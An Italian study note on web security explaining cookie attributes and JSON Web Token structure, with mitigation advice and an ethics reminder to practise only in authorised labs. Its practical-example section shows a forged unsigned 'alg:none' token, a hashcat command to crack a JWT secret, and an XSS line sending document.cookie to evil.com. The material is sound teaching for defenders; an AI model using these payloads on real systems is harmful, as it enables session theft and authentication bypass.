---
tipo: concetto
tag: [web, owasp]
fase: 2
fonti: 4
aggiornato: 2026-06-20
stato: maturo
aliases: ["Cookie e JWT"]

---

# Cookie e JWT

> **Nota etica**: le tecniche descritte vanno studiate e praticate solo su ambienti autorizzati (PortSwigger Web Academy, DVWA, TryHackMe). Usarle su sistemi reali senza permesso è illegale.

## In breve

**Cookie** e **JWT (JSON Web Token)** sono i due meccanismi principali per mantenere l'identità dell'utente tra richieste HTTP stateless. Entrambi hanno configurazioni critiche per la sicurezza: un errore di configurazione può portare a furto di sessione, bypass dell'autenticazione o escalation di privilegi.

## Come funziona

### Cookie di sessione
Il server imposta un cookie con `Set-Cookie`; il browser lo reinvia automaticamente in ogni richiesta. Attributi di sicurezza fondamentali:

| Attributo | Effetto |
|-----------|---------|
| `HttpOnly` | JavaScript non può leggere il cookie (protegge da XSS) |
| `Secure` | Il cookie viaggia solo su HTTPS |
| `SameSite=Strict` | Non inviato in richieste cross-site (protegge da CSRF) |
| `Expires/Max-Age` | Scadenza del cookie |

### JWT
Un JWT è composto da tre parti Base64url-separate da punti:
```
header.payload.signature
```
- **Header**: algoritmo usato (es. `HS256`, `RS256`)
- **Payload**: claims (dati), es. `{"sub":"1","role":"user","exp":1234567890}`
- **Signature**: garantisce che il token non sia stato alterato

Il JWT è **stateless**: il server non tiene traccia delle sessioni, verifica solo la firma.

## Esempio pratico

Vulnerabilità classica JWT — algoritmo `none`:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.
```
Decodificato: `{"alg":"none"}` — alcuni server accettano JWT senza firma, permettendo di forgiare qualsiasi token.

Vulnerabilità `alg: HS256` con chiave debole:
```bash
# Con jwt_tool o hashcat si può trovare la secret key per brute force
hashcat -a 0 -m 16500 <token_jwt> wordlist.txt
```

Cookie senza `HttpOnly` — rubabile via XSS:
```javascript
// Eseguito in un XSS
fetch('https://evil.com/?c=' + document.cookie)
```

## Mitigazione e difesa

**Cookie:**
- Impostare sempre `HttpOnly`, `Secure`, `SameSite=Strict` (o `Lax`)
- Usare nomi prefissati: `__Secure-` o `__Host-` per protezioni aggiuntive del browser

**JWT:**
- Usare algoritmi asimmetrici robusti (`RS256`, `ES256`) invece di `HS256` quando possibile
- **Non accettare mai** l'algoritmo `none`
- Usare **secret key lunghe e casuali** (almeno 256 bit) per HMAC
- Verificare sempre `exp` (scadenza) e `iss` (emittente)
- Revocare i JWT compromessi tramite una denylist o usando scadenze brevi con refresh token

## Collegamenti

- [[Autenticazione e Gestione Sessioni]]
- [[Cross-Site Scripting (XSS)]]
- [[Cross-Site Request Forgery (CSRF)]]
- [[HTTP e HTTPS]]
- [[Burp Suite]]
- [[PortSwigger Web Academy]]

## Fonti

- PortSwigger JWT Attacks: https://portswigger.net/web-security/jwt
- OWASP Session Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- OWASP JWT Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- MDN Set-Cookie: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie
